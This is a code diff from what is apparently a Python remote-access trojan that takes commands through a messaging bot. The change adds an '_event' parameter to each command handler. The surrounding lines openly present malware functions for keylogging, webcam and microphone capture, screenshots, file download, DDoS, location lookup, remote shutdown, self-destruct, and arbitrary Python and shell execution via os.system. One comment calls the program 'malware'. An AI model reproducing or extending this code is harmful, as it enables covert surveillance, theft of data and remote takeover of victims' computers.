@@ -169,7 +169,7 @@ def filesystem_get_type(_path: str) -> str:
     return "Unknown"
 
 
-def command_taskkill(_arguments) -> str:
+def command_taskkill(_arguments, _event) -> str:
     # @function command_taskkill()
     # @returns str
     # @description Function for command "taskkill" that kills process.
@@ -196,7 +196,7 @@ def command_upload(_arguments, _event) -> str:
     return "_event.message!"
 
 
-def command_properties(_arguments) -> str:
+def command_properties(_arguments, _event) -> str:
     # @function command_properties()
     # @returns str
     # @description Function for command "properties" that returns properties of the file.
@@ -229,7 +229,7 @@ def command_properties(_arguments) -> str:
         return "Path does not exists!"
 
 
-def command_download(_arguments) -> list:
+def command_download(_arguments, _event) -> list:
     # @function command_download()
     # @returns str
     # @description Function for command "download" that downloads files.
@@ -265,7 +265,7 @@ def command_download(_arguments) -> list:
         return "Path does not exists" # noqa
 
 
-def command_ddos(_arguments) -> str:
+def command_ddos(_arguments, _event) -> str:
     # @function command_ddos()
     # @returns str
     # @description Function for command "ddos" that starts ddos.
@@ -295,7 +295,7 @@ def command_ddos(_arguments) -> str:
         return "Incorrect arguments! Example: address;time;admin"
 
 
-def command_ls(_arguments) -> str:
+def command_ls(_arguments, _event) -> str:
     # @function command_ls()
     # @returns str
     # @description Function for command "str" that lists all files in  directory.
@@ -307,7 +307,7 @@ def command_ls(_arguments) -> str:
     return ", ".join(os.listdir(_arguments if _arguments != "" else __CURDIR))
 
 
-def command_cd(_arguments) -> str:
+def command_cd(_arguments, _event) -> str:
     # @function command_cd()
     # @returns str
     # @description Function for command "cd" that changes directory.
@@ -340,7 +340,7 @@ def command_cd(_arguments) -> str:
             return f"Directory {_arguments} does not exists!"
 
 
-def command_location(_arguments) -> str:
+def command_location(_arguments, _event) -> str:
     # @function command_location()
     # @returns str
     # @description Function for command "location" that returns location of the PC.
@@ -371,7 +371,7 @@ def command_location(_arguments) -> str:
         return "Couldn't get location"
 
 
-def command_microphone(_arguments) -> list:
+def command_microphone(_arguments, _event) -> list:
     # @function command_microphone()
     # @returns str
     # @description Function for command "microphone" that returns voice message with the microphone.
@@ -398,7 +398,7 @@ def command_microphone(_arguments) -> list:
     return [_path, "Microphone", "audio_message"]
 
 
-def command_help(_arguments) -> str:
+def command_help(_arguments, _event) -> str:
     # @function command_help()
     # @returns str
     # @description Function for command "help" that returns list of all commands.
@@ -407,7 +407,7 @@ def command_help(_arguments) -> str:
     return str(__COMMANDS_HELP) # noqa
 
 
-def command_tags_new(_arguments) -> str:
+def command_tags_new(_arguments, _event) -> str:
     # @function command_tags_new()
     # @returns str
     # @description Function for command "tags_new" that replaces tags.
@@ -458,7 +458,7 @@ def command_tags_new(_arguments) -> str:
         return "Replacing was not completed! No tags passed!"
 
 
-def command_tags_add(_arguments: str) -> str:
+def command_tags_add(_arguments: str, _event) -> str:
     # @function command_tags_add()
     # @returns str
     # @description Function for command "tags_add" that add tags.
@@ -495,7 +495,7 @@ def command_tags_add(_arguments: str) -> str:
     return f"Added new tags: {_new_tags}"
 
 
-def command_message(_arguments: str) -> str:
+def command_message(_arguments: str, _event) -> str:
     # @function command_message()
     # @returns str
     # @description Function for command "message" that shows message.
@@ -549,7 +549,7 @@ def command_message(_arguments: str) -> str:
     return "Message was closed!"
 
 
-def command_webcam(_arguments) -> list:
+def command_webcam(_arguments, _event) -> list:
     # @function command_webcam()
     # @returns list
     # @description Function for command "webcam" that returns webcam photo.
@@ -590,7 +590,7 @@ def command_webcam(_arguments) -> list:
     return [_path, "Webcam", "photo"]
 
 
-def command_screenshot(_arguments) -> list:
+def command_screenshot(_arguments, _event) -> list:
     # @function command_screenshot()
     # @returns list
     # @description Function for command "screenshot" that returns screenshot.
@@ -619,7 +619,7 @@ def command_screenshot(_arguments) -> list:
     return [_path, "Screenshot", "photo"]
 
 
-def command_python(_arguments) -> str:
+def command_python(_arguments, _event) -> str:
     # @function command_python()
     # @returns str
     # @description Function for command "python" that executes python code.
@@ -628,7 +628,7 @@ def command_python(_arguments) -> str:
     return execute_python(_arguments, globals(), locals())
 
 
-def command_tags(_arguments) -> str:
+def command_tags(_arguments, _event) -> str:
     # @function command_tags()
     # @returns str
     # @description Function for command "tags" that returns all tags.
@@ -640,7 +640,7 @@ def command_tags(_arguments) -> str:
     return str(", ".join(__TAGS))
 
 
-def command_version(_arguments) -> str:
+def command_version(_arguments, _event) -> str:
     # @function command_version()
     # @returns str
     # @description Function for command "version" that returns current version.
@@ -649,7 +649,7 @@ def command_version(_arguments) -> str:
     return VERSION
 
 
-def command_name_new(_arguments) -> str:
+def command_name_new(_arguments, _event) -> str:
     # @function command_name_new()
     # @returns str
     # @description Function for command "name_new" that changes name to other.
@@ -674,7 +674,7 @@ def command_name_new(_arguments) -> str:
         return f"Invalid name!"
 
 
-def command_exit(_arguments) -> str:
+def command_exit(_arguments, _event) -> str:
     # @function command_exit()
     # @returns str
     # @description Function for command "exit" that exits malware.
@@ -683,7 +683,7 @@ def command_exit(_arguments) -> str:
     raise SystemExit
 
 
-def command_shutdown(_arguments) -> str:
+def command_shutdown(_arguments, _event) -> str:
     # @function command_shutdown()
     # @returns str
     # @description Function for command "shutdown" that shutdowns PC.
@@ -695,7 +695,7 @@ def command_shutdown(_arguments) -> str:
     return "System was shutdown..."
 
 
-def command_restart(_arguments) -> str:
+def command_restart(_arguments, _event) -> str:
     # @function command_restart()
     # @returns str
     # @description Function for command "restart" that restarts PC.
@@ -707,7 +707,7 @@ def command_restart(_arguments) -> str:
     return "System was restarted..."
 
 
-def command_console(_arguments) -> str:
+def command_console(_arguments, _event) -> str:
     # @function command_console()
     # @returns str
     # @description Function for command "console" that executes console command.
@@ -716,7 +716,7 @@ def command_console(_arguments) -> str:
     return str(os.system(_arguments))
 
 
-def command_destruct(_arguments) -> str:
+def command_destruct(_arguments, _event) -> str:
     # @function command_destruct()
     # @returns str
     # @description Function for command "destruct" that destroys self from the system.
@@ -728,7 +728,7 @@ def command_destruct(_arguments) -> str:
     return command_exit(_arguments)
 
 
-def command_keylog(_arguments) -> str:
+def command_keylog(_arguments, _event) -> str:
     # @function command_keylog()
     # @returns str
     # @description Function for command "keylog" that returns keylog string.
@@ -740,7 +740,7 @@ def command_keylog(_arguments) -> str:
     return __KEYLOG
 
 
-def command_link(_arguments) -> str:
+def command_link(_arguments, _event) -> str:
     # @function command_link()
     # @returns str
     # @description Function for command "link" that opens link in the browser.
@@ -766,7 +766,7 @@ def command_link(_arguments) -> str:
         return "Link was opened (Via system)!"
 
 
-def command_drives(_arguments: str) -> str:
+def command_drives(_arguments: str, _event) -> str:
     # @function command_drives()
     # @returns None
     # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).
